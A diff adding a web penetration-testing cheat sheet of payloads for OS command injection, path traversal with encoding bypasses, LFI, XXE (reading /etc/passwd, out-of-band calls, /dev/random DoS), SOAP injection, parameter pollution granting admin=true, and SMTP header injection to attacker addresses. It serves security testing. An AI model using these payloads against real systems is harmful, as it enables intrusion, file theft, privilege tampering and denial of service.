@@ -1,0 +1,124 @@
+* For template injection (example ?param={{3+5}} try to URL encode {{3+5}} )
+
+* OS command injection flaws are mostly found in administrative applications.
+payloads:  P.S : replace cat /etc/passwd with nslookup or ping -i 30 127.0.0.1 (ping -n 30 127.0.0.1) which causes a 30 seconds time delay before the application responds:
+
+	- ?node=value|%20cat%20/etc/passwd
+	- ?node=value||%20cat%20/etc/passwd
+	- ?node=value&%20cat%20/etc/passwd
+	- ?node=value&&%20cat%20/etc/passwd
+	- ?node=value;%20system('cat%20/etc/passwd')		// in case of PHP
+	- ?node=`ping 127.0.0.1`
+	- ?node=value%20%0acat%20/etc/passwd
+	- ?node=value;response.write%20111111
+	- ?node=value||%20response.write%20111111
+	- ?node=value|%20response.write%20111111
+	- ?node=value&%20response.write%20111111
+	- ?node=value&&%20response.write%20111111
+	- ?node=:response.write%20111111
+
+* If space characters are filtered, try $IFS (it is an environment variable that translates to a space in linux)
+
+* If commands are filtered and < > are not, try ?node=value > /var/www/html/..  (where value is a script that corresponds to the target application's language) because sometimes the application may write back an error and append the value to this error. This way we can access the file /var/www/html/.. using our browser and execute the code.
+
+* Path traversal occurs frequently in uploading and downloading files functionalities.
+
+* The first way to test for path traversal is using this: if the original request is ?page=home/file.txt, submit this: ?page=home/bar/../file.txt    (or if ?page=image.jpg  try ?page=bar/../image.jpg)
+; If the response is the same, the application is mostly vulnerable
+
+* To test a write functionality, try to first give a file that may be written to and then give a file that even root or system can't write into it (the latter may be a directory name):
+
+   in Windows: - write?file=../../../../../../../../../../../../../../writetest.txt
+	       - write?file=../../../../../../../../../../../../../../windows/system32/config/sam
+
+   in Linux: - write?file=../../../../../../../../../../../../../../../tmp/writetest.txt
+	     - write?file=../../../../../../../../../../../../../../../tmp
+
+* P.S: try both / and \ in path traversal payloads because linux base web app may use windows components.
+
+* Try to encode the payload; encode both / or \ and .  ; . ==> %2e (URL encode)
+Try 16-bit unicode encoding : . ==> %u002e    ;  /  ==>  %u2215
+Try double URL encoding: . ==> %252e
+Try UTF-8 unicode encoding: . ==> %c0%2e, %e0%40%ae, %c0ae, and so on
+			    / ==> %c0%af, %e0%80%af, %c0%2f, and so on
+			    \ ==> %c0%5c, %c0%80%5c, and so on
+Try ..\/ ; ../\ ; ..// ; ..\\
+
+* Use the illegal Unicode payload type within Burp Intruder to generate a huge number of alternate representations of any given character
+
+!!! P.S : do not forget to add %00 or # at the end of the payloads (use the same payloads described after adding this) 
+
+* The application may check if the value supplied by the user and given to the parameter starts with a specific value. In this case, use the same payloads but this time add the first value of a valid parameter to the payloads (then the second ..)
+
+* If the application offers a functionality to upload a file, name the file ../../../../../../../../../etc/passwd or ../../../../../../../../etc/passwd/../../tmp/image.jpg for example and upload it. If the application gives a url to download this file after getting its name encypted, specify in the URL only the part that is ../../../../../../etc/passwd
+
+* Try this payload: getImage.jsp?file=getImage.jsp
+
+* For LFI/RFI, applications depending on the language or location specified by the user may be vulnerable: /main.php?lang=fr ; test this with Null byte
+
+* To test for LFI, try to include a static file (found after mapping the application) and check if the response contains it.
+
+* XXE : Try this :
+	POST /search/128/AjaxSearch.ashx HTTP/1.1
+	Host: mdsec.net
+	Content-Type: text/xml; charset=UTF-8
+	Content-Length: 115
+	<!DOCTYPE foo [ <!ENTITY xxe "value" > ]>
+	<Search><SearchTerm>&xxe;</SearchTerm></Search>	//then the app returns value in SearchTerm
+
+and this:
+	POST /search/128/AjaxSearch.ashx HTTP/1.1
+	Host: mdsec.net
+	Content-Type: text/xml; charset=UTF-8
+	Content-Length: 115
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+	<Search><SearchTerm>&xxe;</SearchTerm></Search>
+
+and this:
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net" > ]>
+	<Search><SearchTerm>&xxe;</SearchTerm></Search>
+
+and this:
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///dev/random"> ]> 
+	<Search><SearchTerm>&xxe;</SearchTerm></Search>				//this causes a DoS
+
+* SOAP injection: 
+	- Try submitting </foo> within each parameter. If an error occurs, try to submit <foo></foo>. If the error disappears, the application is vulnerable.
+	- Another method: submit a parameter with <!-- and another with !-->. Change the order at each time and see if an error or something indicates that a parameter was missing.
+	- Sometimes the injected soap tag may be stored and retrieved from the file or database when accessing another functionality.
+
+* When the app uses a user-supplied value to connect to or to retrieve resources from, inject into that parameter hostnames: rather than injecting ?param=http://attacker, try ?param=attacker:port  // try port 22 and see if the ssh banner is returned.
+
+* When injecting a parameter, example:  the original request is:
+	POST ...
+	....
+	account=3&amount=4
+
+and the parameter to inject is admin=true, try this:
+	POST ...
+	...
+	account=3&amount=4%26admin%3d=true  // by URL encoding the & and = characters, you can bypass front-end server.
+
+* Search for third parties used by the app and find if there are additional parameters by checking the source code.
+
+* HTTP parameter pollution is the same but without guessing the parameter. Example:
+Original request:	POST ...
+			...
+			account=3&amount=4&admin=false
+Request with parameter pollution:
+			POST ...
+			...
+			account=3%26admin%3dtrue&amount=4&admin=false // or try account=3&admin=false&amount=4%26admin			%3dtrue
+
+!! P.S: use URL encoding for GET requests too // double URL encoding // and ;()%3badmin=true instead of &admin=true
+
+* When the application offers a functionality that sends a report (email), it is usually using mail or smtp server. Try to inject this : param=aa%0acc: attacker@email.com  (or Bcc: instead of cc: ) 
+Try %0a and %0d%0a
+
+Other payloads:
+	%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+attacker@email.com%0aDATA%0aFrom:+attacker@email.com%0aTo:	+attacker@email.com%0aSubject:+test%0afoo%0a%2e%0a
+
+The terms DATA, MAIL FROM, ... are SMTP commands. 
+Try another payload but using %0d%0a this time
+
+* Review the HTML form, it may contain a disabled field that contains the email that will receive the mail.
